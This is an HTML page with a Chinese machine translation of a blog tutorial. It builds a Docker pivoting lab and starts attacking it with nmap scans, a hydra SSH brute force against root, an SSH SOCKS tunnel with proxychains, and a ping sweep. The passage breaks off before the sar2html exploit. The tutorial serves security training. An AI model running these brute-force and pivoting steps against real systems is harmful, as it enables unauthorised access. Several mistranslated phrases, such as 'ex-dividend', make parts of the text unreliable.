<html>
<head>
<title>Docker: Creating a Pivoting Lab and Exploiting it</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">Docker:创建一个旋转实验室并加以利用</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/docker-creating-a-pivoting-lab-and-exploiting-it-a66646dc2cf3?source=collection_archive---------0-----------------------#2022-07-08">https://infosecwriteups.com/docker-creating-a-pivoting-lab-and-exploiting-it-a66646dc2cf3?source=collection_archive---------0-----------------------#2022-07-08</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><div class=""/><p id="03ea" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><a class="ae kl" href="https://gkiran.com.np/blog/pivoting" rel="noopener ugc nofollow" target="_blank">https://gkiran.com.np/blog/pivoting</a></p><p id="cf91" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir"> Docker-compose文件</strong>:【https://github.com/Cimihan123/Pivoting】T4</p><h1 id="ef1f" class="km kn iq bd ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li lj bi translated">旋转…</h1><p id="723b" class="pw-post-body-paragraph jn jo iq jp b jq lk js jt ju ll jw jx jy lm ka kb kc ln ke kf kg lo ki kj kk ij bi translated">你可能熟悉旋转的概念。旋转是从一个受损系统转移到另一个系统的方式。</p><p id="1ac9" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">假设，<br/><strong class="jp ir">“A”</strong>对“B”有访问权<strong class="jp ir">。<br/><strong class="jp ir">【B】</strong>拥有<strong class="jp ir">到【C】</strong>的访问权限。<br/><strong class="jp ir">【A】</strong>没有<strong class="jp ir">到【C】</strong>的权限。</strong></p><p id="b8ae" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">那么我们如何从<strong class="jp ir">【A】</strong>中访问<strong class="jp ir">【C】</strong>？这不可能直接实现，所以我们使用旋转的概念。<strong class="jp ir">【A】</strong>可以以<strong class="jp ir">【B】</strong>为立足点，获取<strong class="jp ir">【C】</strong>。<strong class="jp ir">【A】</strong>先攻破系统<strong class="jp ir">【B】</strong>然后可以用这台机器作为发射点攻击<strong class="jp ir">【C】</strong>。</p><h1 id="871c" class="km kn iq bd ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li lj bi translated">实验室创建概述</h1><p id="f74b" class="pw-post-body-paragraph jn jo iq jp b jq lk js jt ju ll jw jx jy lm ka kb kc ln ke kf kg lo ki kj kk ij bi translated">为了练习旋转，我在docker中创建了一个实验室。</p><p id="35be" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">下图为我们提供了docker-compose文件的网络设置概览。<strong class="jp ir"> <em class="lp">受害者1 </em> </strong>和<strong class="jp ir"> <em class="lp">受害者2 </em> </strong>都是我们的目标。他们都在同一个子网<em class="lp"> 172.16.101.0/24 </em>上，而<em class="lp">攻击者</em>在不同的子网<em class="lp"> 172.16.100.0/24 </em>上。</p><p id="be7b" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们的辅助机器(网关机器)位于两个子网络上。</p><figure class="lr ls lt lu gt lv gh gi paragraph-image"><div role="button" tabindex="0" class="lw lx di ly bf lz"><div class="gh gi lq"><img src="../Images/52a4dd71df7cac604d43db6f2e5a9d71.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*WRx4YW9YLm1cL4Yl.png"/></div></div></figure><p id="6dfd" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir">Docker合成文件概述</strong></p><p id="789a" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">你可以从我的Github repo中获得docker-compose文件。</p><p id="c68e" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">仓库链接:<a class="ae kl" href="https://github.com/Cimihan123/Pivoting" rel="noopener ugc nofollow" target="_blank">仓库</a></p><p id="144e" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">在本实验中，创建了两个网络</p><p id="1f16" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir">攻击者</strong> - &gt;拥有子网172.16.100.0/24</p><p id="18fc" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir">受害者</strong> - &gt;拥有子网172.16.101.0/24</p><p id="9ce2" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">默认情况下，Docker使用桥驱动程序。虽然我们可以指定不同的网络驱动程序，但我们将使用默认驱动程序</p><figure class="lr ls lt lu gt lv gh gi paragraph-image"><div role="button" tabindex="0" class="lw lx di ly bf lz"><div class="gh gi mc"><img src="../Images/b1e86f6884daef070230e28d9d75e48d.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*yQTZxJiQTQBkkSE6.png"/></div></div><figcaption class="md me gj gh gi mf mg bd b be z dk translated">图:docker-compose-subnet.yml</figcaption></figure><p id="3fe7" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">注意<em class="lp">助手</em>容器是在本地构建的。这使得我们很容易定制基础映像。这是属于两个网络的容器:<strong class="jp ir"> <em class="lp">攻击者</em> </strong>和<strong class="jp ir"> <em class="lp">受害者</em> </strong>。</p><figure class="lr ls lt lu gt lv gh gi paragraph-image"><div class="gh gi mh"><img src="../Images/9ce02cb0ad2b300ab966967a46f2bec6.png" data-original-src="https://miro.medium.com/v2/resize:fit:1004/format:webp/0*HvGz7orC_L--5jg8.png"/></div></figure><p id="a605" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">图:docker-compose.yml</p><p id="b6a5" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">正在提取基本图像。我已经启用了ssh root登录。如果没有适当的安全指南，我不建议这样做。无红利(ex-dividend)</p><figure class="lr ls lt lu gt lv gh gi paragraph-image"><div role="button" tabindex="0" class="lw lx di ly bf lz"><div class="gh gi mi"><img src="../Images/b72b32feb9f7c760033231ff65472e77.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*GcilZFm81x8NtR2u.png"/></div></div><figcaption class="md me gj gh gi mf mg bd b be z dk translated">图:帮手。Dockerfile文件</figcaption></figure><p id="5a86" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir"> <em class="lp">攻击者</em> </strong>是<strong class="jp ir"> <em class="lp">攻击者</em> </strong>子网的一部分，拥有一个IP <strong class="jp ir"> <em class="lp"> 172.16.100.10。</em>T11】</strong></p><figure class="lr ls lt lu gt lv gh gi paragraph-image"><div class="gh gi mj"><img src="../Images/10992f0240b305e021ded5bbc36807ff.png" data-original-src="https://miro.medium.com/v2/resize:fit:1264/format:webp/0*diDMnWK3nxMWlEPK.png"/></div><figcaption class="md me gj gh gi mf mg bd b be z dk translated">图:docker-compose.yml</figcaption></figure><p id="a2b0" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir"> <em class="lp">攻击者</em> </strong>容器也使用了<strong class="jp ir"><em class="lp">phusion/base image</em></strong>。此外，一些其他工具(<strong class="jp ir"> ping、nmap、</strong>等)。)将被安装。</p><figure class="lr ls lt lu gt lv gh gi paragraph-image"><div role="button" tabindex="0" class="lw lx di ly bf lz"><div class="gh gi mk"><img src="../Images/207a6954dc2ef546b3a4db68ab1c07d6.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*HmZJs71UtjsvJQBs.png"/></div></div><figcaption class="md me gj gh gi mf mg bd b be z dk translated">图:攻击者。Dockerfile文件</figcaption></figure><p id="f70a" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir"> <em class="lp">受害者</em> </strong>集装箱也是当地建造的。它确实有网络IP Fig: docker-compose.yml这是子网<strong class="jp ir"><em class="lp">172 . 16 . 101 . 0/24</em></strong>的一部分。</p><figure class="lr ls lt lu gt lv gh gi paragraph-image"><div class="gh gi ml"><img src="../Images/40897a5e3b6428c537040d0e71127e78.png" data-original-src="https://miro.medium.com/v2/resize:fit:1236/format:webp/0*KsX9bE2L7ijM6Lhl.png"/></div></figure><p id="9b9b" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">图:docker-compose.yml</p><p id="d0a0" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir"> wget </strong>下载<strong class="jp ir"> sar2html </strong>工具。Github链接:<a class="ae kl" href="https://github.com/cemtan/sar2html/" rel="noopener ugc nofollow" target="_blank">仓库</a>。</p><p id="cf17" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">它是一个用于系统统计的绘图工具。这个工具有一个问题，我们将在后面讨论。现在，假设这个工具有一个漏洞。</p><figure class="lr ls lt lu gt lv gh gi paragraph-image"><div role="button" tabindex="0" class="lw lx di ly bf lz"><div class="gh gi mm"><img src="../Images/16386a83e8a5a19b13f35435ef1b8d58.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*tO0mzEPyS0IKBP6r.png"/></div></div><figcaption class="md me gj gh gi mf mg bd b be z dk translated">图:受害者1。Dockerfile文件</figcaption></figure><p id="1759" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">对于<strong class="jp ir"> <em class="lp">受害者2 </em> </strong>没有必要对图像进行局部操作。docker hub中已经有一个易受攻击的WordPress。我们只要把它从那里拉出来。下图显示了带有数据库服务器的WordPress的配置结构。它们都在同一个子网中，因此可以相互通信。</p><figure class="lr ls lt lu gt lv gh gi paragraph-image"><div class="gh gi mn"><img src="../Images/8dea5b9812e3ce90f9a0f202336142ee.png" data-original-src="https://miro.medium.com/v2/resize:fit:1198/format:webp/0*WynwQy4_JU9lwP1A.png"/></div><figcaption class="md me gj gh gi mf mg bd b be z dk translated">图:docker-compose.yml</figcaption></figure><p id="621d" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们也有**wp-cli**来自动配置wordpress设置。</p><figure class="lr ls lt lu gt lv gh gi paragraph-image"><div class="gh gi mo"><img src="../Images/b2d3966d78d362da19292bd0fad51aa5.png" data-original-src="https://miro.medium.com/v2/resize:fit:1398/format:webp/0*orDY3JYowc1ddEgH.png"/></div><figcaption class="md me gj gh gi mf mg bd b be z dk translated">图:docker-compose.yml</figcaption></figure><p id="0d75" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">这是我们实验室环境的简要概述。我们现在将运行docker-compose文件并检查它们。</p><h1 id="64df" class="km kn iq bd ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li lj bi translated">Docker构建构建和运行</h1><p id="fa44" class="pw-post-body-paragraph jn jo iq jp b jq lk js jt ju ll jw jx jy lm ka kb kc ln ke kf kg lo ki kj kk ij bi translated">我们首先需要构建它们，这可能需要花费一些时间来提取、下载和安装。然后，我们创建并运行构建的容器。</p><pre class="lr ls lt lu gt mp mq mr ms aw mt bi"><span id="b09e" class="mu kn iq mq b gy mv mw l mx my">docker-compose -f docker-compose-subnet.yml -f docker-compose.yml build<br/>docker-compose -f docker-compose-subnet.yml -f docker-compose.yml up</span></pre><p id="0ade" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">总共有5个容器在运行。<strong class="jp ir"> <em class="lp">攻击者</em> </strong>，<strong class="jp ir"> <em class="lp">助手</em> </strong>，<strong class="jp ir"> <em class="lp">受害者1 </em> </strong>，<strong class="jp ir"> <em class="lp">受害者2</em></strong>(WordPress&amp;MySQL)正在运行。</p><figure class="lr ls lt lu gt lv gh gi paragraph-image"><div role="button" tabindex="0" class="lw lx di ly bf lz"><div class="gh gi mz"><img src="../Images/af14ab9751f4e7c376c35eb72adca822.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*NMXi4ogTVQ0iePvg.png"/></div></div><figcaption class="md me gj gh gi mf mg bd b be z dk translated">图:docker-compose构建和构建</figcaption></figure><p id="cbe7" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir"> <em class="lp">攻击者</em> </strong>容器可以到达<strong class="jp ir"> <em class="lp">帮助者</em> </strong>网络。您应该看到从<strong class="jp ir"> <em class="lp">助手</em> </strong>返回了一个成功的ping应答。</p><pre class="lr ls lt lu gt mp mq mr ms aw mt bi"><span id="be59" class="mu kn iq mq b gy mv mw l mx my">ping helper</span></pre><figure class="lr ls lt lu gt lv gh gi paragraph-image"><div role="button" tabindex="0" class="lw lx di ly bf lz"><div class="gh gi na"><img src="../Images/e84c36df04019580656431a1e5016c39.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*zM-BuY83uxdAeTTW.png"/></div></div><figcaption class="md me gj gh gi mf mg bd b be z dk translated">图:攻击者的Ping检查</figcaption></figure><figure class="lr ls lt lu gt lv gh gi paragraph-image"><div role="button" tabindex="0" class="lw lx di ly bf lz"><div class="gh gi na"><img src="../Images/57a34a9b312f4e35c7c14946052bb82e.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*iDLhdeZif-59wbBW.png"/></div></div><figcaption class="md me gj gh gi mf mg bd b be z dk translated">图:攻击者的Ping检查</figcaption></figure><p id="336e" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">使用下面的图片，你应该能够找出容器之间的联系。</p><figure class="lr ls lt lu gt lv gh gi paragraph-image"><div role="button" tabindex="0" class="lw lx di ly bf lz"><div class="gh gi nb"><img src="../Images/5d4e0515e5375f870268557c191095ad.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*meVgxFY2qUwKm4kv.png"/></div></div><figcaption class="md me gj gh gi mf mg bd b be z dk translated">图:Ping检查</figcaption></figure><h1 id="1040" class="km kn iq bd ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li lj bi translated">攻击和旋转</h1><p id="af15" class="pw-post-body-paragraph jn jo iq jp b jq lk js jt ju ll jw jx jy lm ka kb kc ln ke kf kg lo ki kj kk ij bi translated">让我们首先发现<em class="lp"/><strong class="jp ir"><em class="lp">助手</em> </strong>主机中的端口。所以我们的目标是第一个访问<em class="lp">助手</em>主机的。</p><pre class="lr ls lt lu gt mp mq mr ms aw mt bi"><span id="c75a" class="mu kn iq mq b gy mv mw l mx my">nmap -sC -sV -T4 172.16.100.11</span></pre><figure class="lr ls lt lu gt lv gh gi paragraph-image"><div role="button" tabindex="0" class="lw lx di ly bf lz"><div class="gh gi nc"><img src="../Images/6b0efdbe39716e7863b66ae4e1ed5ae7.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*qWcu7AHL2j90ckVN.png"/></div></div><figcaption class="md me gj gh gi mf mg bd b be z dk translated">图:Nmap扫描(帮助程序)</figcaption></figure><p id="bd94" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">端口22 (ssh)是打开的。我们在攻击者的机器上安装了hydra和一个rockyou.txt文件，暴力强制ssh登录。</p><pre class="lr ls lt lu gt mp mq mr ms aw mt bi"><span id="2c7a" class="mu kn iq mq b gy mv mw l mx my">hydra -l root -P /home/rock.txt ssh://172.16.100.11</span></pre><figure class="lr ls lt lu gt lv gh gi paragraph-image"><div role="button" tabindex="0" class="lw lx di ly bf lz"><div class="gh gi nd"><img src="../Images/5df4eb561a11ecd89bec67f9ad098830.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*zn-jvRK_Fmwbu2qi.png"/></div></div><figcaption class="md me gj gh gi mf mg bd b be z dk translated">图:九头蛇的暴力</figcaption></figure><p id="feee" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们获得了用户<strong class="jp ir"> root </strong>的密码。让我们尝试使用这个凭证。我们现在是在<strong class="jp ir">的助手</strong>机器里。</p><pre class="lr ls lt lu gt mp mq mr ms aw mt bi"><span id="fc75" class="mu kn iq mq b gy mv mw l mx my">ssh root@172.16.100.11</span></pre><figure class="lr ls lt lu gt lv gh gi paragraph-image"><div role="button" tabindex="0" class="lw lx di ly bf lz"><div class="gh gi ne"><img src="../Images/04523fdd9b9ff7c959574adb042f46dd.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*2BaD8cgg9sLWGqLL.png"/></div></div><figcaption class="md me gj gh gi mf mg bd b be z dk translated"><em class="nf">图:宋承宪登录</em></figcaption></figure><p id="defd" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">可能会有其他新的主机，所以我将继续进一步扫描，以收集新的主机和端口。</p><p id="01b2" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir"> <em class="lp"> ifconfig </em> </strong>显示<strong class="jp ir"> <em class="lp">助手</em> </strong>机器是两个网络家族的一部分。</p><pre class="lr ls lt lu gt mp mq mr ms aw mt bi"><span id="a984" class="mu kn iq mq b gy mv mw l mx my"><strong class="mq ir">1. 172.16.100.11<br/>2. 172.16.101.11</strong></span></pre><figure class="lr ls lt lu gt lv gh gi paragraph-image"><div role="button" tabindex="0" class="lw lx di ly bf lz"><div class="gh gi ng"><img src="../Images/7bc3dabf2cec496d6863241289f174e8.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*bw1c_Gz3ex0SF_7a.png"/></div></div><figcaption class="md me gj gh gi mf mg bd b be z dk translated"><em class="nf">图:ifconfig </em></figcaption></figure><pre class="lr ls lt lu gt mp mq mr ms aw mt bi"><span id="9687" class="mu kn iq mq b gy mv mw l mx my">hostname -I -&gt; displays all the addresses for the host</span></pre><figure class="lr ls lt lu gt lv gh gi paragraph-image"><div class="gh gi nh"><img src="../Images/5d1413aed77adb3f9ccb73d678187bde.png" data-original-src="https://miro.medium.com/v2/resize:fit:834/format:webp/0*lPJMuIkn7dc-bgWW.png"/></div><figcaption class="md me gj gh gi mf mg bd b be z dk translated"><em class="nf">图:主机名</em></figcaption></figure><p id="bacf" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">拥有ssh访问使得隧道传输变得非常容易。创建动态端口转发利用了<strong class="jp ir"> SOCKS </strong>代理。这将通过ssh连接，经由给定的端口，将所有的流量传递到目的服务器。在这里，我们将所有流量转发到攻击者的机器。</p><p id="1693" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir"> -N =禁止执行命令</strong></p><p id="6676" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir"> -f =在后台运行</strong></p><pre class="lr ls lt lu gt mp mq mr ms aw mt bi"><span id="265a" class="mu kn iq mq b gy mv mw l mx my">ssh -D 9050 root@172.16.100.11 -f -N</span></pre><figure class="lr ls lt lu gt lv gh gi paragraph-image"><div role="button" tabindex="0" class="lw lx di ly bf lz"><div class="gh gi ni"><img src="../Images/4c53358dd427bb69813a95084026dda2.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*CODeVgm-n02VQMTo.png"/></div></div><figcaption class="md me gj gh gi mf mg bd b be z dk translated">图:动态端口转发</figcaption></figure><p id="18c0" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">交叉检查它是否在后台运行。无红利(ex-dividend)</p><figure class="lr ls lt lu gt lv gh gi paragraph-image"><div role="button" tabindex="0" class="lw lx di ly bf lz"><div class="gh gi ca"><img src="../Images/8fe18e9b12780a48105bfa0ee44e73e7.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*PT0GUph_8UrTxQ57.png"/></div></div><figcaption class="md me gj gh gi mf mg bd b be z dk translated"><em class="nf">图:netstat </em></figcaption></figure><p id="eac2" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们现在需要的是一个代理工具。我将使用<em class="lp">代理链</em>。记住我们在“/etc/proxychains.conf”中提到的端口应该与动态端口相同。</p><figure class="lr ls lt lu gt lv gh gi paragraph-image"><div class="gh gi nj"><img src="../Images/dda08972cca758e82857fc53313923ae.png" data-original-src="https://miro.medium.com/v2/resize:fit:1204/format:webp/0*dGQ4OcKfHo3YK4sR.png"/></div><figcaption class="md me gj gh gi mf mg bd b be z dk translated">图:代理链配置</figcaption></figure><h2 id="07f9" class="mu kn iq bd ko nk nl dn ks nm nn dp kw jy no np la kc nq nr le kg ns nt li nu bi translated">发现新的主机(受害者)</h2><p id="3964" class="pw-post-body-paragraph jn jo iq jp b jq lk js jt ju ll jw jx jy lm ka kb kc ln ke kf kg lo ki kj kk ij bi translated">主要的问题是找到宿主。拥有一个nmap  会更容易，但是通常你不会在现实世界的场景中找到它。</p><figure class="lr ls lt lu gt lv gh gi paragraph-image"><div class="gh gi nv"><img src="../Images/dc65b02852a3657a9dcb24edc0d0038b.png" data-original-src="https://miro.medium.com/v2/resize:fit:986/format:webp/0*lkSVQ49pZe1OT93B.png"/></div><figcaption class="md me gj gh gi mf mg bd b be z dk translated"><em class="nf">图:无nmap </em></figcaption></figure><p id="58b2" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们现在知道<strong class="jp ir"> <em class="lp">助手</em> </strong>是两个网络的一部分。<strong class="jp ir"> <em class="lp">帮手</em> </strong>机和<strong class="jp ir"> <em class="lp">攻击者</em> </strong>机都属于同一个网络<strong class="jp ir">“172 . 16 . 100 . 0/24”</strong>。由于这个原因，我们现在将扫描网络<strong class="jp ir"> "172.16.101.0/24" </strong>以找到所有活动的主机。</p><p id="ebbf" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我正在使用ping扫描技术来扫描新主机。下面的一行代码将以并行模式运行。</p><pre class="lr ls lt lu gt mp mq mr ms aw mt bi"><span id="22f2" class="mu kn iq mq b gy mv mw l mx my">for i in $(seq 1 254); do (ping -c 1 172.16.101.${i} | grep "64 bytes from" | grep -oE "([0-9]{1,3}[\.]){3}[0-9]{1,3}" &amp;); done;</span></pre><figure class="lr ls lt lu gt lv gh gi paragraph-image"><div role="button" tabindex="0" class="lw lx di ly bf lz"><div class="gh gi nw"><img src="../Images/e8a6b746f5172ae4e71c5c84231ebbf3.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*d85Utri9cHSZvccU.png"/></div></div><figcaption class="md me gj gh gi mf mg bd b be z dk translated"><em class="nf">图:使用ping进行主机扫描</em></figcaption></figure><p id="3bc5" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们现在已经收集了总共5个现场主持人。</p><p id="c82a" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir"> 1。172.16.101.11 —助手ip </strong> <br/> <strong class="jp ir"> 2。172.16.101.3 —网关ip </strong> <br/> <strong class="jp ir"> 3。172.16.101.20 —受害者1 ip </strong> <br/> <strong class="jp ir"> 4。172.16.101.21 —受害者2 ip </strong> <br/> <strong class="jp ir"> 5。172.16.101.22 —受害者2 ip </strong></p><h1 id="6d8a" class="km kn iq bd ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li lj bi translated"><strong class="ak">受害者1 </strong></h1><p id="f014" class="pw-post-body-paragraph jn jo iq jp b jq lk js jt ju ll jw jx jy lm ka kb kc ln ke kf kg lo ki kj kk ij bi translated">我们不能ping的原因是代理不支持<strong class="jp ir"> ICMP </strong>协议。它们的工作OSI层是不同的。</p><figure class="lr ls lt lu gt lv gh gi paragraph-image"><div role="button" tabindex="0" class="lw lx di ly bf lz"><div class="gh gi nx"><img src="../Images/38c63d0d960bf7e4882329df28034b94.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*EMs3yIQe0ulYoK5i.png"/></div></div><figcaption class="md me gj gh gi mf mg bd b be z dk translated">图:代理地图ping</figcaption></figure><p id="102a" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们不能ping主机，但是我们可以使用<strong class="jp ir"> Nmap </strong>扫描端口。</p><pre class="lr ls lt lu gt mp mq mr ms aw mt bi"><span id="0459" class="mu kn iq mq b gy mv mw l mx my">proxychains nmap -sT -Pn -F 172.16.101.20</span></pre><p id="2a7f" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir"> -sT — TCP连接扫描</strong></p><p id="d515" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir"> -Pn —不会扫描主机，但会将所有主机视为在线</strong></p><p id="1b5a" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir"> Nmap </strong>显示端口5000上有一个服务打开。</p><figure class="lr ls lt lu gt lv gh gi paragraph-image"><div role="button" tabindex="0" class="lw lx di ly bf lz"><div class="gh gi ny"><img src="../Images/cd4faccd8a9ca4f8698206893f472d24.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*l4KuMZfcvaMcq8oa.png"/></div></div><figcaption class="md me gj gh gi mf mg bd b be z dk translated">图:Nmap扫描(受害者1)</figcaption></figure><p id="6f7a" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们得到一个200状态码。</p><figure class="lr ls lt lu gt lv gh gi paragraph-image"><div role="button" tabindex="0" class="lw lx di ly bf lz"><div class="gh gi nz"><img src="../Images/e9ebc080ff4d9b221dda6f9435328d5e.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*Zarf_U6W_uIK6MIM.png"/></div></div><figcaption class="md me gj gh gi mf mg bd b be z dk translated"><em class="nf">图:卷曲</em></figcaption></figure><p id="bdd5" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">让我们看看这个端口中正在运行什么。在浏览器中打开它。</p><blockquote class="oa ob oc"><p id="14a8" class="jn jo lp jp b jq jr js jt ju jv jw jx od jz ka kb oe kd ke kf of kh ki kj kk ij bi translated"><strong class="jp ir"> <em class="iq"> sar2html </em> </strong> <em class="iq">是系统统计(sar数据)的绘图工具。</em></p></blockquote><figure class="lr ls lt lu gt lv gh gi paragraph-image"><div role="button" tabindex="0" class="lw lx di ly bf lz"><div class="gh gi og"><img src="../Images/3bbf25a73cf192de59980adfab4d96ff.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*pp67kgTVTVxIf3vg.png"/></div></div><figcaption class="md me gj gh gi mf mg bd b be z dk translated">图:Sar2html</figcaption></figure><p id="6d92" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">正如我在博客开头所说的，这个工具有一个漏洞。有一个<strong class="jp 